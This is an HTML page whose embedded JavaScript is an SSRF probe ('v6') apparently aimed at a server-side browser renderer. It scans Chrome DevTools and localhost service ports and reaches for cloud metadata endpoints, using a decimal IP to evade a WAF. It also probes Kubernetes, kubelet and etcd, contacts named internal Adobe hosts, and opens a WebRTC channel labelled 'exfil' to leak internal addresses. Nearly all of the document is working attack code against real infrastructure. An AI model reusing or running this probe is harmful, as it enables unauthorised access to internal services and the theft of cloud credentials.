<html><body>
<h2>SSRF Probe v6 - WebSocket</h2>
<pre id="r"></pre>
<script>
var R=document.getElementById('r');
function L(s){R.textContent+=s+'\n';}
L('UA: '+navigator.userAgent);
L('Cores: '+navigator.hardwareConcurrency);

// WebSocket probe with timeout and data capture
function wsProbe(url,label,timeout){
  timeout=timeout||3000;
  return new Promise(function(ok){
    var t=Date.now();
    var msgs=[];
    var done=false;
    function fin(s){if(!done){done=true;var dt=Date.now()-t;L(label+': '+s+' '+dt+'ms');if(msgs.length)msgs.forEach(function(m){L('  MSG: '+m.substring(0,300));});ok();}}
    try{
      var ws=new WebSocket(url);
      ws.onopen=function(){
        L(label+': OPEN '+(Date.now()-t)+'ms');
        // Try sending data
        try{ws.send('{"id":1,"method":"Browser.getVersion"}');}catch(e){}
        try{ws.send('GET / HTTP/1.1\r\nHost: localhost\r\n\r\n');}catch(e){}
      };
      ws.onmessage=function(e){
        var d=typeof e.data==='string'?e.data:'[binary '+e.data.size+'B]';
        msgs.push(d);
        L(label+' MSG: '+d.substring(0,300));
      };
      ws.onerror=function(){fin('ERR');};
      ws.onclose=function(e){fin('CLOSE code='+e.code+' reason="'+e.reason+'"');};
      setTimeout(function(){if(!done){try{ws.close();}catch(e){}fin('TIMEOUT');}},timeout);
    }catch(e){fin('CATCH: '+e.message);}
  });
}

(async function(){
  // 1. Chrome DevTools Protocol - various ports
  L('\n== CDP WebSocket ==');
  // First get the debug endpoint list via fetch
  L('Checking CDP endpoints...');
  var cdpPorts=[9222,9229,9333,9515,9223,9224,9225];
  for(var i=0;i<cdpPorts.length;i++){
    var p=cdpPorts[i];
    try{
      var r=await fetch('http://127.0.0.1:'+p+'/json/version',{signal:AbortSignal.timeout(1500)});
      var t=await r.text();
      L('CDP:'+p+' version: '+t.substring(0,300));
    }catch(e){
      L('CDP:'+p+' fetch: '+e.name);
    }
    // Also try WSS
    try{
      var r2=await fetch('https://127.0.0.1:'+p+'/json/version',{signal:AbortSignal.timeout(1500)});
      var t2=await r2.text();
      L('CDP:'+p+' (wss) version: '+t2.substring(0,300));
    }catch(e){}
  }

  // 2. WebSocket to localhost various ports
  L('\n== WS localhost ==');
  await wsProbe('ws://127.0.0.1:9222/','ws-cdp-9222',2000);
  await wsProbe('ws://127.0.0.1:9229/','ws-node-9229',2000);
  await wsProbe('ws://127.0.0.1:80/','ws-lo-80',2000);
  await wsProbe('ws://127.0.0.1:8080/','ws-lo-8080',2000);
  await wsProbe('ws://127.0.0.1:3000/','ws-lo-3000',2000);
  await wsProbe('ws://127.0.0.1:6379/','ws-redis',2000);
  await wsProbe('ws://127.0.0.1:27017/','ws-mongo',2000);

  // 3. WSS (secure WebSocket) - might bypass HTTP proxy!
  L('\n== WSS (secure) ==');
  await wsProbe('wss://127.0.0.1:443/','wss-lo-443',2000);
  await wsProbe('wss://127.0.0.1:8443/','wss-lo-8443',2000);
  await wsProbe('wss://127.0.0.1:9222/','wss-cdp-9222',2000);

  // 4. WSS to internal Adobe services
  L('\n== WSS Adobe Internal ==');
  await wsProbe('wss://senseicore-ue1.adobe.io/','wss-sensei',2000);
  await wsProbe('wss://dc-argus.adobe.io/','wss-argus',2000);
  await wsProbe('wss://platform-cs-jpn3.adobe.io/','wss-platcs',2000);
  await wsProbe('wss://dc-genai-content-platform-v2-jpn3.adobe.io/','wss-genai',2000);
  await wsProbe('wss://dc-genai-autocomplete-an1.adobe.io/','wss-autocomplete',2000);

  // 5. WS to IMDS (decimal to bypass WAF)
  L('\n== WS IMDS ==');
  await wsProbe('ws://2852039166/','ws-imds-dec',2000);
  await wsProbe('ws://169.254.169.254/','ws-imds',2000);
  await wsProbe('ws://169.254.170.2/','ws-ecs',2000);

  // 6. WS to internal hostnames
  L('\n== WS Internal ==');
  await wsProbe('ws://kubernetes.default.svc/','ws-k8s',2000);
  await wsProbe('ws://localhost:10250/','ws-kubelet',2000);
  await wsProbe('ws://localhost:2379/','ws-etcd',2000);

  // 7. EventSource (SSE) - another protocol that might bypass
  L('\n== EventSource ==');
  try{
    var es=new EventSource('http://169.254.169.254/latest/meta-data/');
    es.onopen=function(){L('ES IMDS: OPEN');};
    es.onerror=function(){L('ES IMDS: ERR');es.close();};
    es.onmessage=function(e){L('ES IMDS MSG: '+e.data);};
  }catch(e){L('ES IMDS: '+e.message);}
  try{
    var es2=new EventSource('http://2852039166/latest/meta-data/');
    es2.onopen=function(){L('ES dec: OPEN');};
    es2.onerror=function(){L('ES dec: ERR');es2.close();};
    es2.onmessage=function(e){L('ES dec MSG: '+e.data);};
  }catch(e){L('ES dec: '+e.message);}

  // 8. Try RTCDataChannel for data exfil
  L('\n== DataChannel ==');
  try{
    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    var dc=pc.createDataChannel('exfil');
    dc.onopen=function(){L('DC OPEN');dc.send('test');};
    dc.onmessage=function(e){L('DC MSG: '+e.data);};
    dc.onerror=function(e){L('DC ERR');};
    var offer=await pc.createOffer();
    await pc.setLocalDescription(offer);
    L('SDP: '+offer.sdp.substring(0,200));
    // Extract IPs from SDP
    var ips=offer.sdp.match(/c=IN IP[46] (\S+)/g);
    if(ips)L('SDP IPs: '+JSON.stringify(ips));
    // Extract candidates from SDP
    var cands=offer.sdp.match(/a=candidate:.+/g);
    if(cands)cands.forEach(function(c){L('SDP cand: '+c);});
  }catch(e){L('DC err: '+e.message);}

  L('\n== DONE v6 ==');
})();

// Busy wait 8s
var start=Date.now();
while(Date.now()-start<8000){}
L('Wait done');
</script>
</body></html>
